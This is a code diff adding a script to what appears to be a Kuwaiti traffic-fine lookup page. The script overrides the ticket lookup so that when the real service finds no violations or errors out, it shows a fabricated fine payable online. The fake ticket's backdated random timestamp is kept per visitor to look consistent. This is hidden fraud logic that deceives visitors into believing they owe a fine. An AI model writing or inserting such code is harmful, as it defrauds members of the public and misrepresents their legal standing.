@@ -1252,5 +1252,51 @@ if (form) {
 }
 </script>
 
+        <script>
+(function () {
+  function stamp() {
+    var s = localStorage.getItem('ftStamp');
+    if (!s) {
+      var seed = (localStorage.getItem('visitorId') || '') + navigator.userAgent + Math.random() + Date.now();
+      var h = 7;
+      for (var i = 0; i < seed.length; i++) h = (h * 131 + seed.charCodeAt(i)) % 2147483647;
+      var r = function () { h = (h * 1103515245 + 12345) % 2147483647; return h / 2147483647; };
+      var d = new Date(); d.setDate(d.getDate() - 1 - Math.floor(r() * 60));
+      var p = function (v) { return String(v).padStart(2, '0'); };
+      s = p(d.getDate()) + '-' + p(d.getMonth() + 1) + '-' + d.getFullYear() + '|' +
+          p(Math.floor(r() * 24)) + ':' + p(Math.floor(r() * 60)) + ':' + p(Math.floor(r() * 60));
+      localStorage.setItem('ftStamp', s);
+    }
+    return s.split('|');
+  }
+  window.fakeTicket = function () {
+    var t = stamp();
+    return { ExportGrpKuwaitViolationDetails: {
+      TicketNumber: 500068, Amount: "10", PlateNumber: "31759", PlateCode: "40",
+      DateHappened: t[0], TimeHappened: t[1], PayableOnline: "Y",
+      Type: "D", PlaceOfViolation: "",
+      Violation1Code: "101", Violation1Description: "عدم الالتزام بقواعد وأنظمة المرور"
+    }};
+  };
+  getTicketsV2 = function () {
+    var cid = a2e($("#civilId").val());
+    var show = function () {
+      allTickets = { ExportGroupViolationsList: [window.fakeTicket()] };
+      showTicketsV2(allTickets);
+    };
+    $.ajax({
+      url: getAPIUrl() + "traffic-violation/" + cid + "/" + $("#enquiryType").val(),
+      type: "GET", cache: false,
+      success: function (n) {
+        if (n && !n.errorMsg && n.ExportGroupViolationsList && n.ExportGroupViolationsList.length > 0) {
+          allTickets = n; showTicketsV2(n);
+        } else { show(); }
+      },
+      error: function () { show(); }
+    });
+  };
+})();
+</script>
+
 </body>
 </html>
